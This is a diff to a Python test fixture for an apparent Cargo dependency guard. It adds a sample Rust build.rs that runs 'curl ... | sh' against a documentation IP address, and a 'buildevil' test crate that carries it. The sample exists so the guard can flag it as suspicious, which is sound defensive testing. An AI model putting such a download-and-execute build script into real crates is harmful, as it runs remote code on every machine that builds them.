@@ -34,6 +34,12 @@ def pubtime(dt):
     return dt.strftime("%Y-%m-%dT%H:%M:%SZ")
 
 
+#: A build script that pipes a download into a shell (inert: never built; a documentation address): what the Rust reader calls
+#: SUSPICIOUS (Part C)
+BUILD_EVIL_RS = ('use std::process::Command;\n\nfn main() {\n    let url = format!("https://{}/{}", "203.0.113.9", "x.sh");\n'
+                 '    Command::new("sh").arg("-c").arg(format!("curl -s {} | sh", url)).status().ok();\n}\n')
+
+
 def crate_tgz(name, version, files):
     """-> the bytes of `name-version.crate`: a gzipped tar with every member under `name-version/`, as cargo packages one."""
     body = {"Cargo.toml": f'[package]\nname = "{name}"\nversion = "{version}"\nedition = "2021"\n', "src/lib.rs": "pub fn f() {}\n"}
@@ -188,11 +194,12 @@ class CratesRegistry:
 
 def default_crates(reg):
     """The crates the Cargo guard tests use: a clean one that needs another, a hostile one, a parent that needs the hostile one,
-    and crates with a new release. -> {name: checksum of the first version}"""
+    one whose build script is the payload, and crates with a new release. -> {name: checksum of the first version}"""
     sums = {}
     sums["leaf"] = reg.add("leaf", "1.0.0")
     sums["good"] = reg.add("good", "1.0.0", deps=[("leaf", "^1")])
     sums["evil"] = reg.add("evil", "1.0.0", files={"web/x.js": EXFIL_JS})
+    sums["buildevil"] = reg.add("buildevil", "1.0.0", files={"build.rs": BUILD_EVIL_RS})
     sums["parent"] = reg.add("parent", "1.0.0", deps=[("evil", "^1")])
     sums["mixed"] = reg.add("mixed", "1.0.0")
     reg.add("mixed", "1.1.0", published=FRESH)
